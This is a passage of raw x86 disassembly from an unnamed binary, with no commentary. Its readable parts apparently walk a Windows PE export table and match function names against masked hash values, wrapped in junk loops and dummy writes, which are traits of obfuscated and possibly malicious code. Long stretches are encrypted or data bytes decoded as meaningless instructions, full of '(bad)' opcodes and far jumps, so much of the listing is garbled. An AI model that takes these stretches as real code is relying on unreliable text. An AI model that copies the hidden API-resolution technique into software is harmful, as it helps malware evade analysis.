  4119fa:	fild   DWORD PTR [ebx+eiz*8+0x1e003f40]
  411a01:	test   DWORD PTR [edi],esp
  411a03:	pop    es
  411a04:	loopne 0x411a11
  411a06:	jmp    0x7ae0f836
  411a0b:	shr    BYTE PTR [ebp+eax*8+0x13d2f969],cl
  411a12:	cdq    
  411a13:	and    eax,0x3e7bffd9
  411a18:	mov    edi,0x304dcd4c
  411a1d:	mov    ch,0x6c
  411a1f:	or     DWORD PTR [edx],ebx
  411a21:	js     0x411a12
  411a23:	fldenv [edx+0x18]
  411a26:	cli    
  411a27:	jl     0x4119ea
  411a29:	push   esp
  411a2a:	rcl    esp,cl
  411a2c:	cmp    ah,BYTE PTR [edi+0x14]
  411a2f:	and    DWORD PTR [eax+0x42e90bae],ebp
  411a35:	add    edi,DWORD PTR [edi]
  411a37:	dec    esi
  411a38:	cmp    ah,BYTE PTR [edx]
  411a3a:	add    al,0xa9
  411a3c:	lock xor dl,bl
  411a3f:	xchg   esi,ecx
  411a41:	sub    edx,edi
  411a43:	xor    ecx,DWORD PTR ds:0x434677
  411a49:	xor    esi,esi
  411a4b:	adc    DWORD PTR ds:0x4345f7,edi
  411a51:	mov    DWORD PTR [ebp-0x28],esi
  411a54:	mov    DWORD PTR [ebp-0x2c],esi
  411a57:	dec    DWORD PTR ds:0x4346cf
  411a5d:	mov    DWORD PTR [ebp-0x14],esi
  411a60:	mov    DWORD PTR [ebp-0x8],esi
  411a63:	mov    ecx,DWORD PTR [ebp-0x18]
  411a66:	add    DWORD PTR ds:0x4346cf,0x3520
  411a70:	xor    ecx,eax
  411a72:	xor    edi,edi
  411a74:	add    ecx,ebx
  411a76:	mov    DWORD PTR [ebp-0x20],ecx
  411a79:	mov    DWORD PTR ds:0x434637,ebx
  411a7f:	mov    eax,DWORD PTR [ebp-0x20]
  411a82:	mov    DWORD PTR ds:0x4345ff,0x2abf
  411a8c:	je     0x4122b7
  411a92:	adc    DWORD PTR ds:0x4345eb,0x60fd
  411a9c:	mov    eax,DWORD PTR [ebp-0x4]
  411a9f:	adc    DWORD PTR ds:0x434653,0x6e6
  411aa9:	xor    eax,0x7510851
  411aae:	or     DWORD PTR ds:0x4346c3,0x43467b
  411ab8:	add    eax,ebx
  411aba:	mov    DWORD PTR ds:0x434713,0x35f1
  411ac4:	cmp    edi,eax
  411ac6:	jne    0x411c5a
  411acc:	sbb    DWORD PTR ds:0x4345f3,0x4345e7
  411ad6:	push   DWORD PTR [ebp+0x8]
  411ad9:	or     DWORD PTR ds:0x43470f,0x4346cb
  411ae3:	call   0x4104be
  411ae8:	and    ecx,DWORD PTR ds:0x43464f
  411aee:	mov    DWORD PTR [ebp-0x20],eax
  411af1:	mov    eax,DWORD PTR [ebp-0x4]
  411af4:	mov    ecx,DWORD PTR [ebp-0x20]
  411af7:	and    DWORD PTR ds:0x4346b7,0x0
  411b01:	mov    esi,DWORD PTR ds:0x4346b7
  411b07:	inc    esi
  411b08:	mov    DWORD PTR ds:0x4346b7,esi
  411b0e:	cmp    DWORD PTR ds:0x4346b7,0x1e
  411b15:	jne    0x411b26
  411b1b:	push   0x1cd9
  411b20:	call   DWORD PTR ds:0x4132b4
  411b26:	cmp    DWORD PTR ds:0x4346b7,0x18
  411b2d:	jb     0x411b01
  411b33:	mov    esi,0x7510851
  411b38:	xor    eax,esi
  411b3a:	add    eax,ebx
  411b3c:	cmp    ecx,eax
  411b3e:	je     0x411e9b
  411b44:	or     DWORD PTR ds:0x4346b7,0x434677
  411b4e:	push   DWORD PTR [ebp-0x20]
  411b51:	push   DWORD PTR [ebp+0x8]
  411b54:	sub    DWORD PTR ds:0x434637,0x4345e7
  411b5e:	call   0x404d31
  411b63:	movzx  ecx,WORD PTR ds:0x4346b7
  411b6a:	and    ecx,DWORD PTR ds:0x43468b
  411b70:	mov    DWORD PTR ds:0x4346b7,ecx
  411b76:	mov    DWORD PTR [ebp-0x14],eax
  411b79:	mov    DWORD PTR ds:0x43470f,0x13
  411b83:	cmp    DWORD PTR ds:0x43470f,0x0
  411b8a:	je     0x411bc6
  411b90:	cmp    DWORD PTR ds:0x43470f,0x22
  411b97:	jne    0x411bad
  411b9d:	push   0x434810
  411ba2:	push   0x4347b5
  411ba7:	call   DWORD PTR ds:0x4130e4
  411bad:	xor    eax,eax
  411baf:	or     eax,DWORD PTR ds:0x43470f
  411bb5:	dec    eax
  411bb6:	mov    ds:0x43470f,eax
  411bbb:	jmp    0x411b83
  411bc0:	add    DWORD PTR ds:0x4345eb,edx
  411bc6:	mov    eax,DWORD PTR [ebp-0x4]
  411bc9:	mov    DWORD PTR ds:0x4346cb,0x10
  411bd3:	cmp    DWORD PTR ds:0x4346cb,0x0
  411bda:	je     0x411c1c
  411be0:	cmp    DWORD PTR ds:0x4346cb,0x1b
  411be7:	jne    0x411c0a
  411bed:	push   DWORD PTR [ebp-0x20]
  411bf0:	push   0x4372
  411bf5:	push   0x4348d5
  411bfa:	push   0x4348e9
  411bff:	push   0x7ff3
  411c04:	call   DWORD PTR ds:0x4130e8
  411c0a:	mov    ecx,DWORD PTR ds:0x4346cb
  411c10:	dec    ecx
  411c11:	mov    DWORD PTR ds:0x4346cb,ecx
  411c17:	jmp    0x411bd3
  411c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  411c1f:	xor    eax,esi
  411c21:	add    eax,ebx
  411c23:	cmp    ecx,eax
  411c25:	je     0x411e9b
  411c2b:	mov    eax,DWORD PTR [ebp-0x14]
  411c2e:	mov    eax,DWORD PTR [eax+0x18]
  411c31:	mov    DWORD PTR [ebp-0x20],eax
  411c34:	mov    eax,DWORD PTR [ebp-0x14]
  411c37:	mov    ecx,DWORD PTR [ebp+0x8]
  411c3a:	add    ecx,DWORD PTR [eax+0x20]
  411c3d:	mov    DWORD PTR [ebp-0x28],ecx
  411c40:	mov    eax,DWORD PTR [ebp-0x14]
  411c43:	mov    ecx,DWORD PTR [ebp+0x8]
  411c46:	add    ecx,DWORD PTR [eax+0x24]
  411c49:	mov    DWORD PTR [ebp-0x2c],ecx
  411c4c:	mov    eax,DWORD PTR [ebp-0x14]
  411c4f:	mov    ecx,DWORD PTR [ebp+0x8]
  411c52:	add    ecx,DWORD PTR [eax+0x1c]
  411c55:	xor    esi,esi
  411c57:	mov    DWORD PTR [ebp-0x14],ecx
  411c5a:	mov    eax,DWORD PTR [ebp-0x28]
  411c5d:	mov    ecx,DWORD PTR [ebp+0x8]
  411c60:	jmp    0x411e60
  411c65:	scas   al,BYTE PTR es:[edi]
  411c66:	repz push esi
  411c68:	add    dl,BYTE PTR [ebx-0x5d]
  411c6b:	push   0x73
  411c6d:	out    dx,eax
  411c6e:	sub    DWORD PTR [ecx+0x2f],esp
  411c71:	jecxz  0x411c84
  411c73:	sub    al,0xfe
  411c75:	aad    0x56
  411c77:	jle    0x411cf7
  411c79:	pop    ecx
  411c7a:	jg     0x411cfa
  411c7c:	jle    0x411c9d
  411c7e:	dec    edx
  411c7f:	jp     0x411c4b
  411c81:	xlat   BYTE PTR ds:[ebx]
  411c82:	adc    dl,BYTE PTR [edi]
  411c84:	xchg   BYTE PTR [edx],al
  411c86:	fisttp QWORD PTR [ebx]
  411c88:	enter  0x3925,0x6
  411c8c:	popf   
  411c8d:	cmp    ch,BYTE PTR [edx+0x6c]
  411c90:	enter  0x51c2,0x52
  411c94:	jae    0x411c8e
  411c96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c97:	dec    edx
  411c98:	(bad)  
  411c99:	fsub   st,st(0)
  411c9b:	xchg   DWORD PTR [esi-0xe],edx
  411c9e:	sub    DWORD PTR [edx-0x74a5feca],ecx
  411ca4:	cmc    
  411ca5:	mov    WORD PTR [eax-0x14becc49],es
  411cab:	add    cl,bh
  411cad:	loope  0x411c88
  411caf:	push   esp
  411cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cb1:	jecxz  0x411c75
  411cb3:	or     DWORD PTR [edx-0x3d],edx
  411cb6:	xchg   edi,eax
  411cb7:	lahf   
  411cb8:	les    edx,FWORD PTR [ecx]
  411cba:	bswap  edx
  411cbc:	addr16 aaa 
  411cbe:	aaa    
  411cbf:	push   edi
  411cc0:	push   ebp
  411cc1:	sub    eax,0xbb518121
  411cc6:	test   bl,ch
  411cc8:	cs cdq 
  411cca:	loop   0x411c66
  411ccc:	mov    al,0xf1
  411cce:	daa    
  411ccf:	jnp    0x411c8b
  411cd1:	cld    
  411cd2:	adc    DWORD PTR [edi+0x6d021a76],esi
  411cd8:	mov    bl,0xac
  411cda:	push   edi
  411cdb:	mov    ecx,0x43743aef
  411ce0:	xor    al,0xbd
  411ce2:	shl    DWORD PTR [eax+edi*2],0x2
  411ce6:	push   ebp
  411ce7:	push   edx
  411ce8:	arpl   WORD PTR [esi+0x1b],dx
  411ceb:	dec    esp
  411cec:	stos   BYTE PTR es:[edi],al
  411ced:	sub    al,0xb9
  411cef:	sub    eax,0x82591a2c
  411cf4:	push   DWORD PTR [edx]
  411cf6:	sbb    esi,DWORD PTR [esi-0x470f35ff]
  411cfc:	test   bh,cl
  411cfe:	jb     0x411d2f
  411d00:	addr16 pop edi
  411d02:	cld    
  411d03:	outs   dx,BYTE PTR ds:[esi]
  411d04:	adc    edx,ebp
  411d06:	and    DWORD PTR [eax+0x330e9efd],edi
  411d0c:	jmp    0x411cf5
  411d0e:	inc    ebx
  411d0f:	push   ecx
  411d10:	mov    WORD PTR [esi-0x8],cs
  411d13:	and    eax,ebp
  411d15:	into   
  411d16:	dec    eax
  411d17:	cdq    
  411d18:	mov    DWORD PTR [edx+0x3e],0x4eacb4f7
  411d1f:	daa    
  411d20:	lea    ebp,[eax-0x52]
  411d23:	stos   BYTE PTR es:[edi],al
  411d24:	mov    ebx,0x547abab7
  411d29:	xor    eax,0xce671b0b
  411d2e:	je     0x411d1f
  411d30:	cmc    
  411d31:	std    
  411d32:	jne    0x411da5
  411d34:	std    
  411d35:	cdq    
  411d36:	int3   
  411d37:	inc    ebx
  411d38:	xor    eax,0xffffffa5
  411d3b:	in     al,0xa9
  411d3d:	xchg   ebx,eax
  411d3e:	push   ecx
  411d3f:	scas   al,BYTE PTR es:[edi]
  411d40:	push   ds
  411d41:	icebp  
  411d42:	adc    eax,0x634ef35f
  411d47:	pushf  
  411d48:	sbb    DWORD PTR [ebp+0x4f],0x1059ab25
  411d4f:	adc    eax,0xdbd97634
  411d54:	arpl   di,dx
  411d56:	fnstcw WORD PTR [edx-0x59]
  411d59:	es sti 
  411d5b:	ret    0x9da9
  411d5e:	inc    ebp
  411d5f:	mov    ah,0x14
  411d61:	inc    esp
  411d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d63:	xchg   ebx,eax
  411d64:	push   edi
  411d65:	int3   
  411d66:	ins    DWORD PTR es:[edi],dx
  411d67:	arpl   WORD PTR [ebx],bp
  411d69:	mov    ebp,0x8c0ec8c1
  411d6e:	add    al,0xff
  411d70:	jge    0x411dc2
  411d72:	mov    ch,0x8a
  411d74:	mov    ch,0x1
  411d76:	lahf   
  411d77:	add    DWORD PTR [eax],esi
  411d79:	bnd jg 0x411d40
  411d7c:	ret    0x2ec6
  411d7f:	jp     0x411d87
  411d81:	sub    eax,0xec32f235
  411d86:	(bad)  
  411d87:	ins    BYTE PTR es:[edi],dx
  411d88:	daa    
  411d89:	ret    0x1ea9
  411d8c:	and    esp,DWORD PTR [esi+0x41fb6696]
  411d92:	and    edi,ebx
  411d94:	add    al,0x9f
  411d96:	inc    esp
  411d97:	jbe    0x411d74
  411d99:	cld    
  411d9a:	xchg   ebp,eax
  411d9b:	inc    ebp
  411d9c:	leave  
  411d9d:	cmp    DWORD PTR [ebp+0x3c971dde],0x9
  411da4:	das    
  411da5:	add    esp,DWORD PTR [edx]
  411da7:	out    dx,eax
  411da8:	test   BYTE PTR [edx+0x34df6023],bl
  411dae:	adc    al,0x70
  411db0:	out    dx,eax
  411db1:	mov    ah,ah
  411db3:	out    dx,eax
  411db4:	inc    edi
  411db5:	pop    ebx
  411db6:	(bad)  
  411db7:	push   ecx
  411db8:	cmp    ecx,DWORD PTR [esp+eiz*2]
  411dbb:	pop    edi
  411dbc:	jmp    0xaa27:0x84337d38
  411dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dc4:	jg     0x411e40
  411dc6:	sbb    dh,BYTE PTR [edi+ecx*1-0x46]
  411dca:	outs   dx,BYTE PTR ds:[esi]
  411dcb:	and    al,al
  411dcd:	xor    ebp,ecx
  411dcf:	adc    al,0x4a
  411dd1:	or     BYTE PTR [esi-0x7a],al
  411dd4:	or     eax,0x1b51e044
  411dd9:	int    0xb0
  411ddb:	(bad)  
  411ddc:	sub    eax,0xed9b5a62
  411de1:	push   ebx
  411de2:	inc    eax
  411de3:	adc    ch,ch
  411de5:	scas   al,BYTE PTR es:[edi]
  411de6:	mov    bh,0x76
  411de8:	fnsave [ecx+esi*1]
  411deb:	in     al,0x88
  411ded:	call   0x145d7487
  411df2:	setbe  BYTE PTR [edx]
  411df5:	push   0x1e8d88aa
  411dfa:	ret    
  411dfb:	cmp    dh,BYTE PTR [edi]
  411dfd:	adc    al,0x28
  411dff:	dec    eax
  411e00:	imul   ebp,DWORD PTR [ebp-0x1bb7b03e],0xffffffd4
  411e07:	mov    edi,0xefb14cbf
  411e0c:	or     eax,0x187563f1
  411e11:	pop    esi
  411e12:	shl    DWORD PTR [edx],0xbc
  411e15:	jmp    0x70977470
  411e1a:	gs mov ebp,0xe6fce990
  411e20:	push   ds
  411e21:	push   ebx
  411e22:	popa   
  411e23:	push   0xffffffc2
  411e25:	cli    
  411e26:	popaw  
  411e28:	int3   
  411e29:	pop    eax
  411e2a:	mov    ds:0x268fccc3,eax
  411e2f:	into   
  411e30:	mov    ds:0x6b9a89e2,eax
  411e35:	mov    esp,0xf257612b
  411e3a:	jae    0x411eb4
  411e3c:	xor    ebx,DWORD PTR [eax]
  411e3e:	pop    edi
  411e3f:	idiv   BYTE PTR [edx]
  411e41:	not    DWORD PTR [ebp-0x5eed3815]
  411e47:	jl     0x411e33
  411e49:	jmp    0x5f31:0x1a27dc08
  411e50:	out    dx,al
  411e51:	lods   eax,DWORD PTR ds:[esi]
  411e52:	sbb    al,0xf8
  411e54:	dec    edx
  411e55:	push   edi
  411e56:	rol    BYTE PTR [ebp+0x7cd0d46c],0xd8
  411e5d:	add    DWORD PTR [ebx],ecx
  411e5f:	dec    ebx
  411e60:	add    ecx,DWORD PTR [eax+edi*4]
  411e63:	lea    eax,[ebp-0x8]
  411e66:	mov    DWORD PTR [ebp-0x30],ecx
  411e69:	push   eax
  411e6a:	push   DWORD PTR [ebp-0x30]
  411e6d:	push   DWORD PTR [ebp+0xc]
  411e70:	call   0x402e72
  411e75:	mov    eax,DWORD PTR [ebp-0x4]
  411e78:	mov    ecx,DWORD PTR [ebp-0x8]
  411e7b:	xor    eax,0x7510851
  411e80:	add    eax,ebx
  411e82:	cmp    ecx,eax
  411e84:	jne    0x411ea7
  411e8a:	mov    eax,DWORD PTR [ebp-0x20]
  411e8d:	inc    edi
  411e8e:	cmp    edi,eax
  411e90:	jb     0x411a92
  411e96:	jmp    0x4122b7
  411e9b:	mov    eax,DWORD PTR [ebp-0x4]
  411e9e:	xor    eax,esi
  411ea0:	add    eax,ebx
  411ea2:	jmp    0x412c05
  411ea7:	mov    eax,DWORD PTR [ebp-0x2c]
  411eaa:	movzx  eax,WORD PTR [eax+edi*2]
  411eae:	jmp    0x4120ae
  411eb3:	retf   
  411eb4:	dec    ebp
  411eb5:	add    DWORD PTR [edi+0x6d757391],esi
  411ebb:	je     0x411ea0
  411ebd:	jge    0x411f08
  411ebf:	or     al,0xa3
  411ec1:	in     al,0x21
  411ec3:	xor    BYTE PTR [eax+0x7e],dl
  411ec6:	jle    0x411f21
  411ec8:	jg     0x411f48
  411eca:	jle    0x411f05
  411ecc:	aad    0x5e
  411ece:	pusha  
  411ecf:	sbb    DWORD PTR [ebx],ebp
  411ed1:	inc    DWORD PTR [ebp-0x1f]
  411ed4:	mov    es,WORD PTR [eax+0x63]
  411ed7:	outs   dx,BYTE PTR ds:[esi]
  411ed8:	inc    esp
  411ed9:	in     eax,0xe
  411edb:	push   edx
  411edc:	sub    al,BYTE PTR [ebx-0x7ec1e0cf]
  411ee2:	push   edi
  411ee3:	or     eax,0x135e1391
  411ee8:	mov    ch,al
  411eea:	ficomp DWORD PTR [ecx+0x50]
  411eed:	out    dx,al
  411eee:	test   DWORD PTR cs:[edi+edx*8-0x5a4b22a5],0x6684f67
  411efa:	enter  0x397d,0xea
  411efe:	jmp    0x932f47e
  411f03:	mov    dh,0xa9
  411f05:	nop
  411f06:	dec    ebp
  411f07:	mov    al,0x39
  411f09:	sbb    al,dl
  411f0b:	add    bl,0xa1
  411f0e:	mov    dh,BYTE PTR [ecx+ebx*8]
  411f11:	sahf   
  411f12:	sar    DWORD PTR [eax],1
  411f14:	xchg   bh,al
  411f16:	or     ch,cl
  411f18:	mov    cl,0xb
  411f1a:	shl    BYTE PTR [esi+0x7e],1
  411f1d:	les    ebx,FWORD PTR [esi]
  411f1f:	push   ds
  411f20:	repz jp 0x411f3f
  411f23:	in     al,0x59
  411f25:	mov    eax,ds:0x20a2f079
  411f2a:	lods   al,BYTE PTR ds:[esi]
  411f2b:	mov    WORD PTR [eax],gs
  411f2d:	hlt    
  411f2e:	or     DWORD PTR [edi+0x3a8df4ae],0x1b
  411f35:	pop    ecx
  411f36:	dec    ebx
  411f37:	jmp    0xd60d9c9a
  411f3c:	inc    eax
  411f3d:	js     0x411f32
  411f3f:	sbb    edi,esp
  411f41:	xchg   ebx,eax
  411f42:	xor    dh,ah
  411f44:	push   es
  411f45:	out    dx,al
  411f46:	push   cs
  411f47:	add    DWORD PTR [edx],0x1d87a0f3
  411f4d:	loop   0x411ef9
  411f4f:	sbb    DWORD PTR ds:0x67f696df,edi
  411f55:	dec    edi
  411f56:	and    bh,BYTE PTR [eax+0x50]
  411f59:	shl    bh,0xcc
  411f5c:	pop    edi
  411f5d:	inc    ebp
  411f5e:	test   BYTE PTR [ebp-0xbff3b49],bl
  411f64:	je     0x411f96
  411f66:	xor    BYTE PTR [esi+0x1f],ch
  411f69:	cmp    BYTE PTR ds:0xa39f2741,dl
  411f6f:	pop    eax
  411f70:	sub    eax,0x549fa562
  411f75:	icebp  
  411f76:	cwde   
  411f77:	loopne 0x411f04
  411f79:	ret    0xe67c
  411f7c:	dec    ebp
  411f7d:	pop    edx
  411f7e:	aas    
  411f7f:	int3   
  411f80:	dec    esp
  411f81:	lds    edx,FWORD PTR [eax-0x72]
  411f84:	adc    ebx,DWORD PTR [edx+0x17ee090b]
  411f8a:	stos   DWORD PTR es:[edi],eax
  411f8b:	loopne 0x411f89
  411f8d:	pop    ebp
  411f8e:	pop    edi
  411f8f:	fldcw  WORD PTR [edx+0x5f]
  411f92:	push   ebx
  411f93:	mov    BYTE PTR [ecx+esi*8-0x31513b10],dl
  411f9a:	dec    ecx
  411f9b:	ds inc ecx
  411f9d:	push   cs
  411f9e:	wrmsr  
  411fa0:	inc    edi
  411fa1:	dec    edx
  411fa2:	adc    al,0xed
  411fa4:	daa    
  411fa5:	(bad)  
  411fa6:	cmp    cl,al
  411fa8:	imul   edx,DWORD PTR [esi],0x21
  411fab:	mov    WORD PTR [ecx],gs
  411fad:	mov    cl,0xf
  411faf:	fld    QWORD PTR [esi]
  411fb1:	outs   dx,BYTE PTR ds:[esi]
  411fb2:	test   BYTE PTR [esi+0x2a],0x8e
  411fb6:	das    
  411fb7:	test   eax,0xc4b68c87
  411fbc:	dec    eax
  411fbd:	mov    ds:0xd5954f22,eax
  411fc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fc3:	or     al,BYTE PTR [ecx-0x1f]
  411fc6:	lea    ebp,[edi+0x40]
  411fc9:	rol    BYTE PTR ss:[eax-0x60],1
  411fcd:	test   al,0x40
  411fcf:	dec    edx
  411fd0:	daa    
  411fd1:	mov    edx,0xe2f35c24
  411fd6:	cwde   
  411fd7:	dec    DWORD PTR [ebx-0x71ec20fa]
  411fdd:	xchg   DWORD PTR [ebx],esi
  411fdf:	xchg   edi,eax
  411fe0:	(bad)  
  411fe1:	out    0x73,al
  411fe3:	mov    bl,BYTE PTR [ebp+ecx*1-0x1b]
  411fe7:	out    dx,al
  411fe8:	jecxz  0x411fde
  411fea:	xor    ah,ah
  411fec:	sub    bh,BYTE PTR [ecx-0x5462ca99]
  411ff2:	add    eax,0xb430f0e
  411ff7:	popf   
  411ff8:	scas   eax,DWORD PTR es:[edi]
  411ff9:	jbe    0x411fdc
  411ffb:	sbb    eax,0x69f224c8
  412000:	or     BYTE PTR ss:[eax-0x719ef4d],cl
  412007:	jnp    0x411fe7
  412009:	pop    ss
  41200a:	idiv   DWORD PTR [edi+0x292d9add]
  412010:	xchg   ecx,eax
  412011:	jp     0x41200b
  412013:	sub    edx,DWORD PTR [esp+edx*2+0x7a]
  412017:	xchg   ecx,eax
  412018:	push   ebp
  412019:	lock jle 0x412087
  41201c:	xchg   ecx,eax
  41201d:	cmp    eax,0xcae2ae9
  412022:	dec    edx
  412023:	mov    cl,0x8c
  412025:	jns    0x412024
  412027:	pop    ds
  412028:	shl    BYTE PTR [esi+0x11eef52c],1
  41202e:	xchg   edi,eax
  41202f:	dec    ecx
  412030:	cmp    DWORD PTR [esi-0x764c2716],ecx
  412036:	ins    BYTE PTR es:[edi],dx
  412037:	inc    edx
  412038:	pusha  
  412039:	mov    ah,0x49
  41203b:	(bad)  
  41203c:	xchg   esi,eax
  41203d:	test   al,0xe4
  41203f:	mov    ds:0x7646a7ea,eax
  412044:	fist   WORD PTR [esi+0x1e758799]
  41204a:	pop    ebx
  41204b:	in     eax,0xaf
  41204d:	and    eax,0x295187d
  412052:	mov    edx,0xc3afdbf7
  412057:	fstp   DWORD PTR [esi-0x49]
  41205a:	lds    edx,FWORD PTR [ebp+0x7c]
  41205d:	inc    ebp
  41205e:	lods   eax,DWORD PTR ds:[esi]
  41205f:	popa   
  412060:	arpl   WORD PTR [ecx],bp
  412062:	adc    al,BYTE PTR [edx-0x21]
  412065:	inc    ecx
  412066:	or     al,0x8e
  412068:	ss and al,0xcf
  41206b:	jp     0x412092
  41206d:	aam    0x6b
  41206f:	sbb    edi,eax
  412071:	adc    al,0x62
  412073:	sbb    ecx,edi
  412075:	add    ebp,edi
  412077:	mov    al,0x23
  412079:	xor    DWORD PTR [edx-0x46],esp
  41207c:	xchg   DWORD PTR [esi],ebp
  41207e:	pop    ebx
  41207f:	push   esi
  412080:	dec    eax
  412081:	xchg   edx,eax
  412082:	add    edx,edi
  412084:	or     BYTE PTR [eax-0x1706d1d1],al
  41208a:	enter  0x61a8,0xc0
  41208e:	aas    
  41208f:	xor    eax,0x71686465
  412094:	repnz cmp eax,0xbf5406f7
  41209a:	xor    ah,BYTE PTR [ebp-0x4df3f9e6]
  4120a0:	mov    DWORD PTR [edx+0x58389ff4],ebp
  4120a6:	add    eax,0xce4fd243
  4120ab:	jmp    0x4120ba
  4120ad:	dec    ebx
  4120ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4120b1:	mov    eax,DWORD PTR [ecx+eax*4]
  4120b4:	jmp    0x4122b4
  4120b9:	cmp    DWORD PTR [ecx+ebx*4+0x69156508],esp
  4120c0:	jne    0x4120eb
  4120c2:	xchg   edx,eax
  4120c3:	mov    al,0xd4
  4120c5:	popa   
  4120c6:	add    eax,0x5213379e
  4120cb:	jle    0x41214b
  4120cd:	pop    ecx
  4120ce:	jg     0x41214e
  4120d0:	jle    0x4120cd
  4120d2:	in     al,0xf1
  4120d4:	mov    edi,0x974db2f0
  4120d9:	lds    ecx,FWORD PTR [ecx-0x17aeeb83]
  4120df:	mov    ecx,0xf18dddc3
  4120e4:	cdq    
  4120e5:	in     eax,dx
  4120e6:	push   edi
  4120e7:	jmp    0xfbeb:0x7c0b0bed
  4120ee:	div    DWORD PTR [ecx+0xb]
  4120f1:	sbb    BYTE PTR [eax+0x20],cl
  4120f4:	lea    edi,[eax]
  4120f6:	add    al,0x30
  4120f8:	push   cs
  4120f9:	or     BYTE PTR [ebx+ebp*4],bl
  4120fc:	mov    ebx,0xbb911b2d
  412101:	int3   
  412102:	daa    
  412103:	inc    esp
  412104:	push   edx
  412105:	pop    ecx
  412106:	jae    0x412158
  412108:	jne    0x412122
  41210a:	retf   
  41210b:	xor    ch,BYTE PTR [eax]
  41210d:	inc    ebp
  41210e:	(bad)  
  41210f:	in     al,0x8b
  412111:	xor    al,0x76
  412113:	call   0x1e881ecb
  412118:	mov    gs,WORD PTR [ebx]
  41211a:	or     BYTE PTR [edx],dh
  41211c:	mov    ds:0x31ae5b8c,al
  412121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412122:	pop    ebx
  412123:	ins    DWORD PTR es:[edi],dx
  412124:	push   edx
  412125:	or     eax,0x18e131bd
  41212a:	mov    ebx,0x6b26c4ae
  41212f:	add    DWORD PTR [edi+eiz*4+0x1c],esi
  412133:	jle    0x412155
  412135:	daa    
  412136:	out    dx,eax
  412137:	loopne 0x41219b
  412139:	dec    ecx
  41213a:	xor    esp,DWORD PTR [edx+0x77]
  41213d:	xor    eax,0xa8354ec1
  412142:	jle    0x412161
  412144:	mov    ebp,0x7e64305c
  412149:	loop   0x4121a7
  41214b:	push   DWORD PTR [ebx+0x4415dc4b]
  412151:	rol    BYTE PTR [edi],cl
  412153:	cdq    
  412154:	cmc    
  412155:	push   esi
  412156:	retf   
  412157:	push   ss
  412158:	sub    al,0x67
  41215a:	add    al,0xc3
  41215c:	sub    ebp,DWORD PTR [edx]
  41215e:	push   esp
  41215f:	ret    0x310d
  412162:	cmp    al,0x73
  412164:	imul   eax,DWORD PTR [ebp+ebx*2-0x3d],0xffffffd3
  412169:	retf   
  41216a:	dec    edi
  41216b:	add    al,0xc5
  41216d:	xlat   BYTE PTR ds:[ebx]
  41216e:	push   edi
  41216f:	sub    ch,ah
  412171:	mov    eax,0x929939cf
  412176:	and    esi,esp
  412178:	push   ebp
  412179:	lahf   
  41217a:	jo     0x4121cd
  41217c:	aas    
  41217d:	popf   
  41217e:	fldcw  WORD PTR [eax]
  412180:	mov    edx,DWORD PTR [edx+0x3a1ba1aa]
  412186:	jecxz  0x4121a6
  412188:	lahf   
  412189:	adc    BYTE PTR [ecx+0x3037e810],dl
  41218f:	inc    DWORD PTR [ebx]
  412191:	fisub  WORD PTR [eax+esi*4]
  412194:	pop    ebx
  412195:	aas    
  412196:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412197:	adc    ch,BYTE PTR [esi-0x7]
  41219a:	sub    BYTE PTR [ebx+0x690649d1],dh
  4121a0:	jnp    0x41217f
  4121a2:	shl    BYTE PTR [eax+0x36],cl
  4121a5:	sahf   
  4121a6:	cmp    esi,ecx
  4121a8:	push   ds
  4121a9:	add    DWORD PTR [eax+0x554f05cf],esp
  4121af:	(bad)  
  4121b0:	jecxz  0x4121a9
  4121b2:	aam    0xd5
  4121b4:	sub    eax,0x251e03f3
  4121b9:	out    0x2c,al
  4121bb:	(bad)  
  4121bd:	xor    DWORD PTR [ecx],0xffffffe6
  4121c0:	push   ebp
  4121c1:	mov    esp,0xcf60cdb9
  4121c6:	xor    al,0xaf
  4121c8:	call   FWORD PTR [edx]
  4121ca:	cmc    
  4121cb:	jp     0x4121f1
  4121cd:	fninit 
  4121cf:	sub    DWORD PTR [esi+0x41],edi
  4121d2:	jb     0x412208
  4121d4:	cs cmp esp,esi
  4121d7:	adc    ecx,edi
  4121d9:	test   BYTE PTR [esi],0x73
  4121dc:	add    BYTE PTR [edx],bh
  4121de:	sbb    bl,BYTE PTR [edi-0x6d804e7d]
  4121e4:	sbb    dh,BYTE PTR [edi+0x32762f46]
  4121ea:	xor    bh,dl
  4121ec:	mov    ah,0x9c
  4121ee:	ss dec ecx
  4121f0:	shl    BYTE PTR [edi+ebp*1-0x2a0b0920],cl
  4121f7:	jne    0x412200
  4121f9:	inc    eax
  4121fa:	imul   ebp,edi,0x28
  4121fd:	inc    ebx
  4121fe:	pop    ebx
  4121ff:	and    dh,ch
  412201:	in     eax,0x29
  412203:	or     al,BYTE PTR [edi+eax*1+0x22ec655c]
  41220a:	fistp  QWORD PTR [edi]
  41220c:	jp     0x4121e9
  41220e:	int    0x76
  412210:	inc    edi
  412211:	mov    esi,0xd13df4a6
  412216:	mov    ?,WORD PTR [ebx+0x7249d2cc]
  41221c:	pop    DWORD PTR ss:[edx]
  41221f:	daa    
  412220:	and    eax,0x3844bbd1
  412225:	das    
  412226:	(bad)  
  412228:	dec    edi
  412229:	ret    
  41222a:	push   edi
  41222b:	add    esi,ebx
  41222d:	call   0xa94b:0xd9c58c1e
  412234:	inc    edx
  412235:	adc    al,BYTE PTR [ebx-0x4e]
  412238:	adc    DWORD PTR [eax+0x67f6583f],ecx
  41223e:	rol    BYTE PTR [ebx+0x1e],0xeb
  412242:	push   edx
  412243:	neg    bh
  412245:	cld    
  412246:	inc    edx
  412247:	cmp    cl,cl
  412249:	out    dx,al
  41224a:	cmp    DWORD PTR ds:0x4d390c66,edi
  412250:	fcom   QWORD PTR [edi-0x56064757]
  412256:	cmp    BYTE PTR [edi+0x44],cl
  412259:	jmp    0x9125:0x6792a45b
  412260:	push   ebx
  412261:	rcr    BYTE PTR [edx+0x7184c9a5],0x7c
  412268:	jmp    0x6c26:0x3065ef52
  41226f:	inc    edi
  412270:	pop    ss
  412271:	in     eax,dx
  412272:	leave  
  412273:	add    eax,DWORD PTR [edx]
  412275:	cmp    ecx,eax
  412277:	clc    
  412278:	sbb    al,0xad
  41227a:	inc    eax
